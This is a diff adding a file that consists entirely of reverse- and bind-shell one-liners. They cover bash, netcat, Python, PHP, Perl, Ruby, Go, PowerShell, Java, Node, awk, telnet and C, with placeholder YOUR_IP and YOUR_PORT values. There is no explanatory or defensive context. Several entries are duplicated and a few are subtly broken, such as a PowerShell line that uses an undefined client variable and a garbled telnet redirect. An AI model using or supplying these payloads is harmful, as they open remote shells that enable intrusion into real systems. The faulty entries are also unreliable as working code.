@@ -1,0 +1,37 @@
+bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
+0<&196;exec 196<>/dev/tcp/YOUR_IP/YOUR_PORT; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/YOUR_IP/YOUR_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
+bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'
+nc -e /bin/sh YOUR_IP YOUR_PORT
+/bin/sh | nc YOUR_IP YOUR_PORT
+rm -f /tmp/p; mknod /tmp/p p && nc YOUR_IP YOUR_PORT 0</tmp/p | /bin/sh >/tmp/p 2>&1
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+php -r '$sock=fsockopen("YOUR_IP",YOUR_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("YOUR_IP",YOUR_PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+perl -e 'use Socket;$i="YOUR_IP";$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ruby -rsocket -e'f=TCPSocket.open("YOUR_IP",YOUR_PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","YOUR_IP:YOUR_PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("YOUR_IP",YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/YOUR_IP/YOUR_PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()
+require('child_process').exec('bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1');
+awk 'BEGIN {s = "/inet/tcp/0/YOUR_IP/YOUR_PORT"; while(1) { printf "sh " |& s; while ((s |& getline c) > 0) { if (c) { while ((c | getline) > 0) print |& s; close(c) } } close(s); } }'
+rm -f /tmp/p; mknod /tmp/p p && telnet YOUR_IP YOUR_PORT 0/tmp/p | /bin/sh >/tmp/p 2>&1
+#include <stdio.h>;#include <sys/socket.h>;#include <netinet/in.h>;#include <unistd.h>;int main() {int sock = socket(AF_INET, SOCK_STREAM, 0);struct sockaddr_in serv_addr;serv_addr.sin_family = AF_INET;serv_addr.sin_addr.s_addr = inet_addr("YOUR_IP");serv_addr.sin_port = htons(YOUR_PORT);connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);execve("/bin/sh", NULL, NULL);return 0;}
+php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,"0.0.0.0",YOUR_PORT);socket_listen($sock,1);$client=socket_accept($sock);exec("/bin/sh -i <&3 >&3 2>&3");'
+perl -e 'use Socket;$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);while(accept(C,S)){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'
+bash -i >& /dev/tcp/0.0.0.0/YOUR_PORT 0>&1
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",YOUR_PORT));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+nc -lvnp YOUR_PORT -e /bin/sh
+ruby -rsocket -e 's=TCPServer.new("0.0.0.0",YOUR_PORT);while(c=s.accept);exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",c,c,c);end'
+require('child_process').exec('nc -lvnp YOUR_PORT -e /bin/sh');
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, YOUR_PORT); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+sh -c 'sh -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'
+bash -c '0<&196;exec 196<>/dev/tcp/YOUR_IP/YOUR_PORT;sh<&196>&196 2>&196'
+sh -c 'exec 5<>/dev/tcp/YOUR_IP/YOUR_PORT;cat<&5|while read;do $REPLY 2>&5>&5;done'
+bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'
+python -c 'import socket,subprocess,os;s=socket.socket(2,1);s.connect(("YOUR_IP",YOUR_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call(["/bin/sh","-i"])'
+python3 -c 'import socket,subprocess,os;s=socket.socket(2,1);s.connect(("YOUR_IP",YOUR_PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];p=subprocess.call(["/bin/sh","-i"])'
+powershell -NoP -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = ([text.encoding]::ASCII).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+perl -e 'use Socket;$i="YOUR_IP";$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+php -r '$sock=fsockopen("YOUR_IP",YOUR_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
